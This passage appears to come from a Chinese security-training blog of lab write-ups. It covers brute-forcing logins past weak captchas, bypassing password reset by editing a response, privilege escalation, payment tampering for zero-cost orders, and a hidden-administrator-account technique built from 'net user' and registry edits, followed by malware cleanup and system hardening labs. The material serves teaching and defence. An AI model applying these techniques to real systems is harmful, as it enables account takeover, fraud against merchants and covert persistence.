验证机制之绕过验证码前端验证实验目的通过本实验，掌握使用字典暴力破解绕过验证码在前端验证的逻辑，从而暴破出用户名密码登录。 实验环境 操作机：Win10用户名：Administrator密码：Sangfor!7890 靶机：Apache + PHP 实验地址：http://ip/pikachu/vul/burteforce/bf_client.php 实验原理登录页面在设置用户名和密码的时候，没有遵循密码设置规则，但是增加了验证码，需要输入验证码，而验证码的逻辑又放在前端，通过抓包发现后台不会对输入错误的验证码进行验证，在浏览器中，输入错误的验证码是有提示的。前端设置的验证码如同虚设，后端又不会对验证码进行验证。那么可以略过验证码，直接进行暴力破解就可以了，借助字典利用穷举法将所有可能的用户名和密码一一尝试，进行蛮力攻击，最后暴力破解出用户名和密码，绕过验证机制。 实验步骤1、登陆”Attack”操作机，打开浏览器，访问http://ip/pikachu/vul/burteforce/bf_client.php 2、随便输入用户名为：“root”，密码为“123456”以及随意验证码进行提交，弹框提示验证码输入错误 3、点击“确定”，还是随便输入用户名为：“root”，密码为“123456”以及正确验证码 4、打开桌面的的“Burp”文件夹，双击“BURP.cmd”启动Burp Suite抓包工具 5、切换到“Proxy”代理模块的“Options”，查看Bp的代理 6、切换到浏览器，选择火狐插件中的代理（配置浏览器的的代理），与Bp的代理一致 7、点击“Login”，提交输入的用户名、密码以及验证码，Bp成功抓取数据包（验证码输入错误时，无法抓取到数据包，只有验证码输入正确时才能抓到数据包，由此可以判断验证码的验证逻辑在前端） 8、右键，选择“Send to Intruder”以及“Send to Repeater”，分别将数据包发送到暴破模块和重发模块 9、在“Repeater”中对数据包修改验证码为任意，然后点击“Send”放包，查看响应包发现后台不会对输入错误的验证码进行验证，在浏览器中，输入错误的验证码是有提示的 10、切换到浏览器，右键选择“查看页面源代码”，浏览代码中发现验证码的验证逻辑是在客户端的实现规则 11、通过前端验证码的验证逻辑的代码可以发现Javascript会从0-9和26个大写字母中随机挑选5个作为验证码，然后用 validate() 去验证，并且每点一次验证码，就会调用 createCode() 改变验证码 12、前端设置的验证码如同虚设，后端不会对验证码进行验证。那么不用理会验证码，直接进行暴力破解。切换到BurpSuite的的“Intruder”模块 13、点击“Clear §”，清除所有Payload位置标志，重新选择“username”和“password”两个需要暴破的位置标志，点击“Add §” 14、将攻击模式设置为“Cluster bomb” 15、切换到“Payloads”，设置攻击载荷。设置攻击位置1的payload类型为”Simple list”，并加载用户名字典 16、设置攻击位置2的payload类型为”Simple list”，并加载密码字典 17、点击“Start attack”，开始暴力破解，暴破成功 实验总结通过本实验，掌握在遇到登录页面增加有验证码验证，首先判断是前端验证还是后端验证，前端设置的验证码如同虚设，就可以略过验证码，直接使用字典暴力破解，对暴破的结果根据长度进行分析，长度值与其他不同的就是正确结果，从而绕过登录验证机制。 验证机制之绕过验证码服务端验证实验目的通过本实验，掌握使用字典暴力破解绕过验证码在前端验证的逻辑，从而暴破出用户名密码登录。 实验环境 操作机：Win10用户名：Administrator密码：Sangfor!7890 靶机：Apache + PHP 实验地址：http://ip/pikachu/vul/burteforce/bf_server.php 实验原理登录页面在设置用户名和密码的时候，没有遵循密码设置规则，但是增加了验证码，用来防止恶意注册、防止暴力破解；验证码需要判断验证的逻辑是放在前端还是服务端，服务端验证码常见问题： 12341、验证码不生效，导致验证码的验证逻辑无效2、验证码不过期，导致验证码不失效，可以长期使用3、验证码设计太简单以及有规律，可以被预测、猜解4、验证码校验不严格，验证逻辑出现问题 利用验证码的问题，进行验证码绕过，再借助字典利用穷举法将所有可能的用户名和密码一一尝试，进行蛮力攻击，最后暴力破解出用户名和密码，绕过验证机制。 实验步骤1、登陆”Attack”操作机，打开浏览器，访问http://ip/pikachu/vul/burteforce/bf_server.php 2、随便输入用户名为：“root”，密码为“123456”以及随意验证码进行提交，页面提示验证码输入错误 3、随便输入用户名为：“root”，密码为“123456”以及正确验证码进行提交，页面提示“username or password is not exists” 4、打开桌面的的“Burp”文件夹，双击“BURP.cmd”启动Burp Suite抓包工具 5、切换到“Proxy”代理模块的“Options”，查看Bp的代理 6、切换到浏览器，选择火狐插件中的代理（配置浏览器的的代理），与Bp的代理一致 7、随便输入用户名为：“root”，密码为“123456”以及随意验证码，点击“Login”，提交输入的用户名、密码以及验证码，Bp成功抓取数据包，说明后端对验证码是有验证的 8、点击“Drop”，丢弃数据包 9、随便输入用户名为：“root”，密码为“123456”以及正确验证码进行提交，重新抓包 10、右键，选择“Send to Intruder”以及“Send to Repeater”，分别将数据包发送到暴破模块和重发模块 11、在“Repeater”中点击“Send”，发送数据包，查看响应包，提示“username or password is not exists” 12、换个密码再发送一次数据包，查看响应包，依然提示“username or password is not exists”，正常来说应该提示验证码错误，说明验证码长期有效，可以直接暴力破解 13、切换到BurpSuite的的“Intruder”模块，点击“Clear §”，清除所有Payload位置标志，重新选择“username”和“password”两个需要暴破的位置标志，点击“Add §” 14、将攻击模式设置为“Cluster bomb” 15、切换到“Payloads”，设置攻击载荷。设置攻击位置1的payload类型为”Simple list”，并加载用户名字典 16、设置攻击位置2的payload类型为”Simple list”，并加载密码字典 17、点击“Start attack”，开始暴力破解，暴破成功 实验总结通过本实验，掌握在遇到登录页面增加有验证码验证，首先判断是前端验证还是后端验证，前端设置的验证码如同虚设，就可以略过验证码，后端验证看验证码是否生效，不生效直接使用字典暴力破解，对暴破的结果根据长度进行分析，长度值与其他不同的就是正确结果，从而绕过登录验证机制。 验证机制之找回密码实验目的通过本实验，掌握利用密码重置过程中经常遇见的一些问题，绕过安全验证，从而重置密码。 实验环境 操作机：Win10用户名：Administrator密码：Sangfor!7890 靶机：Apache + PHP 实验地址：http://ip/index.php 实验原理在网站的忘记密码位置进行找回密码的过程中，可以利用密码重置过程中常见的一些问题绕过安全验证，从而实现重置密码。常见密码重置问题： 1234561、用户名枚举：网站反馈多余信息，可猜测用户信息2、验码返回前端处理：可截获、修改3、修改Request：用户名、手机号、邮箱、Cookie等信息可修改4、修改Response：操作结果成功/失败可修改5、暴力破解验证码：验证码长度有限，或验证码未设置可靠的失效时间6、拼凑密码重置链接：重置密码链接有规可循 实验步骤阶段一：管理员安装cms，搭建企业网站1、登陆”Attack”操作机，打开浏览器，访问http://ip/index.php 2、根据提示，点击“点击运行安装向导”，安装cms 3、点击“我同意”，然后一直点击“下一步” 4、填写必要信息，数据库密码要填写“root”；数据库名任意设置，比如“zzcms”；管理员密码任意设置，比如“123456” 5、然后一直点击“下一步”，直至安装完成 6、点击“网站首页”，跳转至网站首页，至此企业网站搭建完成 阶段二：任意用户注册账号7、点击右上角的“免费注册”，跳转到注册账号界面 8、填写相关信息，点击“提交”，注册账号成功 9、点击“安全退出”，退出登录 阶段三：攻击者重置用户密码10、点击右上角的“请登录”，跳转登录账号界面 11、由于攻击者不知道账号密码，点击“找回密码”，进行尝试 12、输入任意用户名，提示“该用户名不存在”，利用网站反馈的多余信息，不断猜测用户名，直到正确为止 13、根据图片验证码中的结果填写，进行验证码验证，然后点击“下一步”，进入安全验证阶段 14、由于验证码会发送到用户的邮箱进行安全验证，而攻击者无法获取到验证码，无法进入下一步。尝试抓包，打开桌面的的“Burp”文件夹，双击“BURP.cmd”启动Burp Suite抓包工具 15、切换到“Proxy”代理模块的“Options”，查看Bp的代理 16、切换到浏览器，选择火狐插件中的代理（配置浏览器的的代理），与Bp的代理一致 17、随便输入验证码（不要点击获取验证码），点击“下一步”，提交输入的验证码，Bp成功抓取数据包 18、右键，选择“Do intercept”下的“Response to this request”，抓取响应数据包（即可以抓取数据包的响应包进行修改） 19、点击“Forward”，转发数据包，获取响应数据包 20、把响应数据包中的“no”改为“yes”,然后点击“Forward”，继续转发数据包 21、切换到浏览器，发现已经绕过安全验证，关闭浏览器代理，输入任意新密码即可，比如“sxf123”，点击“确定”即可 22、重置密码成功 23、点击“登录”，用修改的密码尝试登录，成功登录 实验总结通过本实验，掌握在找回密码的过程中，可以利用密码重置的常见攻击方法进行尝试，枚举用户名、抓包修改数据包、暴力破解验证码、拼接重置密码连接等方法尝试绕过安全验证，从而重置密码，登录账户。 越权之水平越权实验目的通过本实验，掌握水平越权漏洞的原理、利用过程以及危害。 实验环境 操作机：Win10用户名：Administrator密码：Sangfor!7890 靶机：Apache + PHP 实验地址：http://ip/pikachu/vul/overpermission/op1/op1_login.php 实验原理水平越权也叫横向越权，相同权限下不同的用户可以互相访问，比如A和B是相同权限下的用户，如果A能看到理论上只有B能看到的信息，或者A能执行理论上只有B能执行的操作，这就是水平越权。 实验步骤1、登陆”Attack”操作机，打开浏览器，访问http://ip/pikachu/vul/overpermission/op1/op1_login.php 2、由于水平越权需要相同权限下不同的用户可以互相访问，所以需要先使用账户登录。点击“点一下提示”，找到给出的用户名密码。 3、先使用lucy账户登录，登录成功后发现有“点击查看个人信息”的地方 4、点击之后，查看lucy的个人信息 5、发现查看lucy的个人信息的URL中参数username的值是用户名lucy；由此猜测该参数值是哪个用户名就回显哪个用户的信息，因此将username的值由lucy替换为lili，发现lucy用户信息的页面已经切换为Lili的用户信息，成功实现水平越权。 实验总结通过本实验，掌握水平越权的漏洞原理，使用lucy账户登录，查看lucy用户的个人信息，通过修改username的值为其他用户名，实现查看其他用户的个人信息，成功水平越权，展现了水平越权漏洞的危害。 权限控制之垂直越权实验目的通过本实验，掌握利用垂直越权漏洞，抓包修改管理员的登录密码。 实验环境 操作机：Win10用户名：Administrator密码：Sangfor!7890 靶机：Apache + PHP 实验地址：http://ip/webug/pentest/test/3 实验原理普通用户登录后正常逻辑只能看到自己的账户信息，通过抓包后修改管理员用户的登录密码，修改成功。 实验步骤1、登陆”Attack”操作机，打开浏览器，访问http://ip/webug/pentest/test/3 2、输入用户名为：“tom”，密码为“123456”提交，登陆成功 3、点击更改密码，跳转到修改密码页面，用户名显示在URL 4、随便输入密码全部为：“test” 5、打开桌面的的“Burp”文件夹，双击“BURP.cmd”启动Burp Suite抓包工具 6、切换到“Proxy”代理模块的“Options”，查看Bp的代理 7、切换到浏览器，选择火狐插件中的代理（配置浏览器的的代理），与Bp的代理一致 8、点击“更改密码”，提交输入的密码，Bp成功抓取数据包 9、将“username”更改为“admin” 10、点击“Forward”，转发数据包，切换到浏览器，密码更改成 11、点击“确定”，关闭浏览器代理 12、输入用户名为：“admin”，密码为：“test”，点击“submit”提交用户名和密码，登录成功 实验总结通过本实验，掌握逻辑漏洞中的权限控制问题，通过登录普通用户抓包修改，成功修改管理员的登录密码，并且用管理员的用户名和密码登录成功。 越权之垂直越权实验目的通过本实验，掌握垂直越权漏洞的原理、利用过程以及危害。 实验环境 操作机：Win10用户名：Administrator密码：Sangfor!7890 靶机：Apache + PHP 实验地址：http://ip/pikachu/vul/overpermission/op2/op2_login.php# 实验原理垂直越权也叫纵向越权，使用权限低的用户可以访问到权限较高的用户。比如A用户权限比B低，如果A可以访问理论上只有B才能访问的资源，或者执行理论上B才能执行的操作，这就是垂直越权。 实验步骤1、登陆”Attack”操作机，打开浏览器，访问http://ip/pikachu/vul/overpermission/op2/op2_login.php# 2、由于垂直越权需要低权限用户访问高权限用户，所以需要先使用账户登录。点击“点一下提示”，找到给出的用户名密码。 3、提示中给了两个用户，一个是高权限的管理员用户，一个是普通用户。先使用高权限管理员admin登录 4、管理员admin用户可以查看用户列表、添加用户、删除用户等功能。点击“添加用户”，到添加用户界面，并填写添加用户的相关信息 5、打开桌面的的“Burp”文件夹，双击“BURP.cmd”启动Burp Suite抓包工具 6、切换到“Proxy”代理模块的“Options”，查看Bp的代理 7、切换到浏览器，选择火狐插件中的代理（配置浏览器的的代理），与Bp的代理一致 8、点击“创建”，抓取数据包，并将其发送至“Repeater”重复发包模块，然后丢弃该数据包 9、关闭代理，在登录界面使用低权限用户pikachu登录，该用户只有查看权限，然后再次打开代理 10、刷新页面，抓取数据包 11、复制低权限pikachu用户Cookie字段的PHPSESSID值到Repeater模块抓取的高权限admin用户添加用户的数据包中 12、点击“Send”，发送数据包，然后切换至浏览器关闭代理 13、在低权限用户pikachu登录的状态下，刷新查看用户的页面，发现用户添加成功，使用只有查看用户功能的低权限的Cookie成功执行了高权限才有的添加用户功能，实现了垂直越权。 实验总结通过本实验，掌握垂直越权的漏洞原理，使用管理员admin账户登录，可以查看用户、添加用户、删除用户；在添加用户页面抓包，然后登录普通用户pikachu，将管理员用户的Cookie替换为普通用户的Cookie，添加用户成功，成功垂直越权，展现了垂直越权漏洞的危害。 支付逻辑之修改商品单价实验目的通过本实验，掌握支付流程中存在的业务逻辑层面的漏洞。 实验环境 操作机：Win10用户名：Administrator密码：Sangfor!7890 靶机：Apache + PHP 实验地址：http://ip/webug/pentest/test/2/ 实验原理在系统的支付流程中由于服务器端没有对客户端请求数据中金额、单价、数量等敏感信息做校验，造成商家的经济损失，导致产生支付逻辑漏洞。 实验步骤1、登陆”Attack”操作机，打开浏览器，访问http://ip/webug/pentest/test/2/ 2、用户名输入为：“tom”，密码输入为“123456”提交，登陆成功 3、打开桌面的的“Burp”文件夹，双击“BURP.cmd”启动Burp Suite抓包工具 4、切换到“Proxy”代理模块的“Options”，查看Bp的代理 5、切换到浏览器，选择火狐插件中的代理（配置浏览器的的代理），与Bp的代理一致 6、在对应的商品下选择购买的数量 7、点击“购买”按钮，提交数据，Bp成功抓取数据包 8、将数据包中的价格bill1和bill2修改为0 9、点击“Forward”，转发数据包，切换到浏览器，实现0元购买 实验总结通过本实验，掌握支付流程中存在的业务逻辑层面的漏洞。在系统的支付流程中由于服务器端没有对客户端请求数据中单价做校验，造成“0元购”，导致产生支付逻辑漏洞。 支付逻辑之修改商品数量实验目的通过本实验，掌握支付流程中存在的业务逻辑层面的漏洞。 实验环境 操作机：Win10用户名：Administrator密码：Sangfor!7890 靶机：Apache + PHP 实验地址：http://ip/webug/pentest/test/2/ 实验原理在系统的支付流程中由于服务器端没有对客户端请求数据中金额、单价、数量等敏感信息做校验，造成商家的经济损失，导致产生支付逻辑漏洞。 实验步骤1、登陆”Attack”操作机，打开浏览器，访问http://ip/webug/pentest/test/2/ 2、用户名输入为：“tom”，密码输入为“123456”提交，登陆成功 3、打开桌面的的“Burp”文件夹，双击“BURP.cmd”启动Burp Suite抓包工具 4、切换到“Proxy”代理模块的“Options”，查看Bp的代理 5、切换到浏览器，选择火狐插件中的代理（配置浏览器的的代理），与Bp的代理一致 6、在对应的商品下选择购买的数量 7、点击“购买”按钮，提交数据，Bp成功抓取数据包 8、将数据包中的数量num1修改为负 9、点击“Forward”，转发数据包，切换到浏览器，实现0元购买 实验总结通过本实验，掌握支付流程中存在的业务逻辑层面的漏洞。在系统的支付流程中由于服务器端没有对客户端请求数据中数量做校验，造成“0元购”，导致产生支付逻辑漏洞。 支付漏洞之修改商品编号实验目的通过本实验，掌握购物支付流程中存在的业务逻辑层面的漏洞。 实验环境 操作机：Win10用户名：Administrator密码：Sangfor!7890 靶机：Apache + PHP 实验地址：http://ip/index.php 实验原理支付漏洞一直以来就是高风险漏洞，对用户和企业的危害都很大。网上购物的整体流程为：搜索、挑选商品 -&gt; 下单购买 -&gt; 付款-&gt;发货。在系统的支付流程中，由于开发者在编写购物程序时，对客户端请求数据中金额、单价、数量、商品编号等敏感信息的逻辑处理不当，攻击者利用目标网站本身的逻辑问题，造成商家的经济损失，导致产生支付逻辑漏洞。 实验步骤1、登陆”Attack”操作机，打开浏览器，访问http://ip/index.php 2、点击“登录”，跳转到登录界面。在购物之前先登录购物账号，用户名为“test”，密码为“123456”，登陆即可（也可以自己注册账号） 3、在分类侧点击“手机”，跳转到手机一类的商品，任意选择一款手机点击，查看该商品的id，比如苹果手机，商品id是54 4、回到首页，点击下方的苹果商品，可以看到该商品的id是42 5、打开桌面的的“Burp”文件夹，双击“BURP.cmd”启动Burp Suite抓包工具 6、切换到“Proxy”代理模块的“Options”，查看Bp的代理 7、切换到浏览器，选择火狐插件中的代理（配置浏览器的的代理），与Bp的代理一致 8、点击“立即购买”，开始抓包 9、将数据包中该商品的“id”修改为手机的商品id【54】 10、点击“Forward”，转发数据包。切换到浏览器，关闭代理。可以看到订单信息中，商品名称是手机，单价是苹果水果的单价。注意：在挖掘支付逻辑漏洞的时候一般支付方式为在线支付 11、点击“提交订单”，可以看到支付的金额已经是水果苹果的价格 12、点击左侧的“订单管理”，成功可以看到该订单 实验总结掌握支付流程中存在的业务逻辑层面的漏洞。在系统的支付流程中由于服务器端没有对客户端请求数据中商品编号做校验，造成低价购买高价产品，导致产生支付逻辑漏洞。","tags":["sxf","Red"],"categories":["Experiments"]},{"title":"某厂产业教育 - 安全管理配置与事件处置","path":"/2024/09/13/红蓝攻防/安全管理配置与事件处置/","content":"Windows隐藏账户处置实验目的理解windows隐藏账户建立原理，掌握windows隐藏账户处置过程 实验环境一台windows server 2012 r2 实验原理通过注册表实现隐藏账户的建立，可以通过手工来建立隐藏账户 实验步骤一、使用命令行创建用户1、打开命令行 2、新建test$用户 12net user test$ sxf!7890 /addnet localgroup administrators test$ /add 二、观察test$用户1、使用系统计算机管理工具 发现可以看到test$用户 2、使用命令行查看用户 在命令行输入 1net user 无法看到test$用户 三、导出test$和administrator用户注册表信息1、打开注册表 命令行中输入 1regedit 2、获取SAM项权限 刷新权限 3、导出test$用户信息 导出下面键为test.reg 这里0X3EA为随机值，每台主机都会不一样 1HKEY_LOCAL_MACHINE\\SAM\\SAM\\Domains\\Account\\Users\\Names\\test$ 4、导出test$的UID值 5、导出administrator的UID项 在windows下，administrator的UID固定为1F4 四、修改导出的注册表信息1、将admin_id中的F值，复制到uid中的F值 编辑admin_id 复制F的值 编辑uid 粘贴F值 保存文件 五、删除test$用户，导入注册表1、删除test$用户 使用下面命令 1net user test$ /del 2、导入桌面上的 test 和 uid注册表文件 导入test 导入uid 六、查看隐藏账户1、使用计算机管理，查看用户，并未发现test$ 2、修改组策略，允许自定义用户登录 在命令提示符中输入 1gpedit.msc 定位到安全选项，不显示最后的用户名 启用，确定 注销administrator用户 使用test$用户登录 输入用户名 test$输入密码sxf!7890 登录成功 使用任务管理器，查看当前用户 实验总结通过手动建立隐藏账户，了解windows隐藏账户工作原理。通过原理，反向可以处理隐藏账户。也可以使用一些工具处理隐藏账户。 沙箱分析浏览器病毒实验目的掌握windows下文件监控工作的应用 实验环境一台windows server 2012 r2 ，浏览器被首页劫持。无法更改。病毒位和检测工具都位于环境之中。 实验原理通过本地工具和云沙箱，监测样本运行，发现样本操作，进行针对性处理。 实验步骤一、使用微软的process monitor监测病毒运行 本病毒是一个借助激活工具，二次打包后劫持浏览器的病毒。 病毒名为”mlxg.exe”,位于桌面mlxg文件夹中 打开微软的process monitor 双击打开，按图配置监控规则。监控规则的含义是，监控进程名为mlxg.exe 点击OK 此时，我们还没有运行病毒，所以屏幕没有任何显示 二、运行病毒程序 双击mlxg.exe 运行 三、查看precess monitor 可以看到mlxg进程对系统的操作， 先停止捕获信息，（如果捕获太多，会让软件有些卡顿） 点一下放大镜，停止捕获 重点关注新建注册表和新建文件，可以重点发现一些操作和目录如 创建一个DLL文件 写临时文件 写驱动文件 写EXE文件 过滤注册表操作 写注册表操作，尝试建立一个GRE隧道 四、使用云沙箱分析样本 打开桌面chrome浏览器，输入域名s.threatbook.cn 上传我们的病毒样本 因为我们是64位系统，所以选win7 64,查看报告， 等待，系统分析完成，可以查看处置建议 等等一系列处理 再可以使用桌面的pchunter或其它类似工具，进行应急响应处置 总结使用分析工具，分析样本行为，然后针对性处理，是应急响应中的常用方法。 使用此方法的前提是知晓病毒来源与样本文件。怎么样找到此类文件，我们需要更多的经验和日志分析技巧。 勒索病毒处置实验目的掌握针对勒索病毒的判断、识别、处置方法 实验环境一台Windows server 2012r2 已经中了勒索病毒 实验原理识别勒索病毒，有些勒索病毒因为程序编写漏洞或开发者放弃，可以找到解密密钥。进行解密 实验步骤一、观察勒索病毒登录系统，发现桌面背景提示 初步可以判断，系统已经中了勒索病毒 尝试用记事本，打开桌面的文本文档 双击记事本 发现文件被加密，是乱码 确定中了勒索病毒 二、查看桌面提示关键字通过桌面背景发现加密关键字 ENCRYPTED BY GANDCRAB 5.0.3 三、了解GRANCRAB勒索病毒通常各大安全厂商有勒索病毒专区，如国际厂商kaspersky、bitdefender、avast、symantec，国内厂商Sangfor、360等 如Avast的 https://www.avast.com/zh-cn/ransomware-decryption-tools 如深信服的 http://edr.sangfor.com.cn/#/information/ransom_search 这里我们使用深信服的页面 搜索该病毒名 查看报告，该报告为5.2版本的病毒原理介绍 同学可以自行查看 四、尝试使用工具解密病毒 尝试去寻找不同的厂商的解密工具 在bitdefender寻找解密工具 在avast页面找到gandcrab的标签 下载软件 这里有很多不同版本的解密工具，为避免下载问题，实验环境中已经内置好解密工具。学员也可以自行尝试下载不同工具，尝试解密。 打开文件夹C:\\USERS\\download2\\ 双击运行软件BDGandCrabDecryptTool 同意许可 确定提示 选择要解密的文件夹，这里以桌面为例 开始解密 解密完成 再次查看桌面的记事本，已经解密成功。 接下就是备份解密后的文件，重装系统，安装补丁等操作 总结勒索病毒并不是都像实验环境中这么容易解密。目前能解密的勒索病毒只是少数，我们更多的是需要加强对勒索病毒的防御。如使用EDR软件进行保护，或加强系统补丁安装。主流勒索病毒传播都是通过RCE漏洞或弱口令进行自动化攻击，针对这两点做好防御，加强主动防御。可防范勒索病毒。 挖矿病毒处置实验目的了解挖矿病毒的现象，学会处置挖矿病毒 实验环境一台Windows server 2012R2 已经中了控矿病毒 实验原理通过任务管理器、进程、启动项等对挖矿病毒进行处置 实验步骤一、登录系统，查看任务管理器 发现CPU占用满了，按CPU对进程排序 结束CPU占用高的进程 可以观察到 结束后，进程会重新自启动。确定有父进程。 转到进程详细信息 看到进程名为xmrig.exe 二、找到父进程 直接使用wmic工具 打开命令行 输入下面命令 1wmic process where name=&#x27;xmrig.exe&#x27; get caption,parentprocessid 找到父进程ID为1048 三、查找父进程启动方式 将任务管理器按PID排序，找到1048的进程 发现进程用户名为SYSTEM，通常SYSTEM用户是使用系统服务启动。查找系统服务 停用服务 停用服务后，发现xmrig.exe进程也停止。CPU利用率也降下来 四、处理文件和服务此病毒仅使用服务加载，并没有hook系统函数，所以对文件和服务的处理相对较为容易 1、查看服务和文件 打开服务 双击服务名 记住服务名称和 可执行文件路径 2、删除文件 找到路径，删除文件夹 C:\\USERS\\Administrator\\c3pool 删除后如图 3、删除服务 使用命令行删除服务 1sc delete c3pool_miner 五、重启验证 重启后打开任务管理器，CPU占用已经下去，病毒已被清除。 总结通过实验 结合wmic与任务管理器，处理了一个很普通的“矿机”病毒 通常挖矿病毒会占用大量CPU，所以会很直接的暴露自己，并不太需要使用驱动级或HOOK等隐藏方式。 挖矿病毒因为利益原因，通常也是自动传播，传播方式与勒索病毒相似，但病毒表现完全不同。具体传播原因多为RCE漏洞与弱口令。做好基础防护工作，可轻松应对。 浏览器劫持事件处置实验目的掌握windows下驱动级病毒处理过程 实验环境一台windows server 2012 r2 ，浏览器被首页劫持。无法更改。 实验原理通过驱动级工具，发现驱动级病毒。清除病毒，恢复系统。 实验步骤一、观察劫持现象1、打开桌面上的chrome浏览器 发现浏览器首页域名为hp1.dhwz444.top 然后快速的会跳转到 hao123.com 2、打开IE浏览器 点击开始 点击IE浏览器 发现首页同样被劫持 二、尝试手动恢复浏览器首页打开IE设置 选择Internet选项 使用新选项卡 关闭IE浏览器 再次打开IE浏览器，首页依然被劫持。 三、检查系统驱动1、使用微软套件autoruns工具 打开桌面tools文件夹，打开autoruns64.exe 同意申明 autoruns打开后会列出系统所有的开机加载项。 重点关注红色项、黄色项，或签名有问题的项 如图，红框，标注的部分，显示为（Not verifiedt）Microsoft Corporation，说明这两个声称是微软的文件，但并没有获取微软的签名。 尝试删除这两个文件。 删除后刷新页面，发现这两个链接仍然存在。 再次删除，提示标记为已删除 四、重启计算机，看能否删除上面两个驱动级服务。 再次打开autoruns ，观察发现仍然存在这两个服务。可以推定这两个服务一定是“非正常的” 五、尝试删除文件右键，选择jump to image，打开文件路径 发现无法直接看到文件 打开windows的隐藏文件与系统文件显示 查看 选项 如图设置 文件夹仍然为空。 此时可以断定此驱动服务为恶意程序。 且hook了系统的api,隐藏自身。 六、使用驱动级工具PC HUNTER进行对抗打开桌面PCHunter工具 查看驱动模块 可以发现PCHunter 检查驱动模块时，并没有校验签名，只是查看了文件信息。 记住这两个文件的路径，C:\\USER\\Administartor\\AppData\\Local\\Microsoft\\WindowsApps\\ 浏览文件，定位到这个路径 删除文件 观察发现无效 ，选中文件后，右键 “删除后阻止文件再生” 强制删除 强制删除目录 再次重启系统。 打开IE浏览器或chrome浏览器，首页已经恢复正常 到此，我们解决了病毒的释放驱动，及其启动文件的删除。 接下来，进行注册表信息的清理，因为已删除相关文件，病毒对注册的表保护也没有了，直接删掉即 打开autoruns,删除相关注册表信息即可。 实验总结本实验，我们通过windows提供的atuoruns 发现驱动级病毒， 通过pchunter进行驱动级查找删除。 当然本实验只是对病毒进行了初步的处理工作，没有深入分析病毒来源与病毒是否清楚干净。 每个工具都有自己不同的特点，但想充分使用这些工具，还需要更多的了解操作系统基础知识。 基线管理之Windows安全配置实验目的理解windows安全配置选项，掌握Windows组策略配置，理解Windows安全配置检查工具的应用。 实验拓扑略 实验环境一台windows server 2012 R2 实验原理windows通过组策略展示了详细的操作系统配置，通过配置组策略，将设置保存于windoows注册表，以便操作系统加载各项配置。 实验步骤一、登录服务器，打开组策略开始–运行 输入gpedit.msc，点确定 二、账户策略配置1、密码策略 依次如图展开，密码策略，如图进行配置 2、账户锁定策略 配置账户锁定阈值 三、配置安全选项1、账户配置 如图 重命名管理员账号为test1234(配置完后，可以尝试注销，看看administrator是否能登录) 禁止使用Microsoft账户登录 2、交互式登录配置 如图，配置 3、用户账户控制 如图，配置以下四项 四、高级安全审核配置1、账户登录 2、账户管理 3、详细跟踪 4、登录&#x2F;注销 5、对象访问 6、特权使用 实验总结本实验讲了windows常用安全配置，但不够全面，仅仅列举了一部分配置。学员可以先理解这些配置的具体作用，以及尝试验证配置生效。再来举一返三的理解其它配置。除了手动配置外，windows提供了一些基线管理工具，可以便于我们更加方便的维护windows基线。有兴趣的学员可以自己研究。参考网址如下 微软件基线管理工具 基线管理之Centos安全配置实验目的通过配置Centos配置文件，加强Centos默认安全配置。同时也是理解linux一切皆文件的思想。尝试用shell脚本来处置Centos的安全配置。 实验环境一台Centos 7.2 无需其他环境。 实验原理Linux操作系统的配置基本上以配置文件展示，通过不同配置文件理解不同的配置。 实验步骤一、网络配置1、检查不用的连接 使用以下命令 1ip link show up 如下图，发现有两个连接一个为lo，一个为eth0，如果有需要关闭的接口，可以使用ip link set down 2、关闭IP转发 先查看ip转发配置 1sysctl net.ipv4.ip_forward 查看发现为0，如果是1，可以使用下面命令改为0 1sysctl -w net.ipv4.ip_forward=0 3、关闭数据包重定向 查看数据包重定向设置 1sysctl net.ipv4.conf.all.send_redirects 查看发现为1，可以使用下面命令改为0 1sysctl -w net.ipv4.conf.all.send_redirects=0 4、开启SYN cookies 查看syn cookies配置 1sysctl net.ipv4.tcp_syncookies 发现为1，已经开启。如果为0，则使用下面命令改为1 1sysctl -w net.ipv4.tcp_syncookies=1 二、查看审计服务1、查看服务是否开启 1systemctl status auditd 如上图显示服务已经开启，如未开启可以使用下面命令开启 1systemctl start auditd 2、查看审计日志大小 1cat /etc/audit/auditd.conf |grep max 如图显示最大日志为6M，可以自己修改文件，然后重启auditd服务后生效。 三、查看并配置日志审计1、查看日志文件权限，日志权限应为600，仅root可读写 使用下面命令 1ls -l /var/log/ 非600的文件，如wpa_supplicant.log 可以使用下面命令改为600 1chmod 600 /var/log/wpa_supplicant.log 再次查看 2、查看日志归档处理 确保存在&#x2F;etc&#x2F;logrotate.d&#x2F;syslog文件 使用以下命令 1ls /etc/logrotate.d/syslog 四、查看SSH认证配置1、检查SSH配置文件权限 1ls -l /etc/ssh/sshd_conf 如图显示权限为644，建议改为600，使用以下命令 1chmod 600 /etc/ssh/ssd_conf 2、配置允许SSH允许的验证失败次数 查看当前配置 1sshd -T |grep maxauthtries 如上图显示，默认为6次登录失败后断开连接。可以修改&#x2F;etc&#x2F;ssh&#x2F;sshd_config文件的MaxAuthTires值进行修改。 3、禁止空密码登录SSH 1sshd -T | grep permitemptypasswords 4、查看SSH支持密码算法，确保没有md5 des等已经不安全的算法 1sshd -T | grep ciphers 五、认证模块配置 Linux的认证模块由PAM处理，PAM中可以配置认证的账号、密码强度等操作。 1、密码强度配置 1vim /etc/security/pwquality.conf 如下图 可以自己修改配置，去掉行首#号 如将密码最小设为10位，设置minlen &#x3D; 10将密码复杂度为4种类型（包含大写字母、小写字母、数字、符号），设置minclass &#x3D;4 如图设置，设置后保存退出。 2、密码过期时间设置 查看过期时间 1grep ^\\s*PASS_MAX_DAYS /etc/login.defs 默认过期时间为9999天，修改相应文件即可修改过期时间 3、查看用户密码过期时间 (学员们还记得Linux操作系统里面的正则表达式吗？) 1grep -E &#x27;^[^:]+:[^!*]&#x27; /etc/shadow | cut -d: -f1,5 修改root用户过期时间 1chage --maxdays 365 root 4、自动禁用账号 1useradd -D | grep INACTIVE 如图显示-1表示不会自动禁用账号 使用下面设置30天未使用的账号自动禁用 1useradd -D -f 30 实验总结通过本实验，理解Centos的基本安全加固配置 同学们也可以去网上找一些centos安全加固脚本，进行配置，尝试理解脚本原理 基线管理之apache安全配置实验目的理解apache安全配置项的作用，掌握安全配置项的配置方法 实验拓扑实验环境一台Centos 7.2服务器，已安装apache httpd ,并开机自启动。 实验原理通过编辑apache配置文件实现apache的安全配置，apache默认配置文件路径是&#x2F;etc&#x2F;httpd&#x2F;conf&#x2F;httpd.conf 实验步骤一、确保apache无法访问根目录查看apache配置文件，确定里面对根目录是拒绝所有请求 1vim /etc/httpd/conf/httpd.conf 按箭头，下翻可以找到以下配置 其中，第一行和第四行，指明了目录，即Linux的根目录 &#x2F; 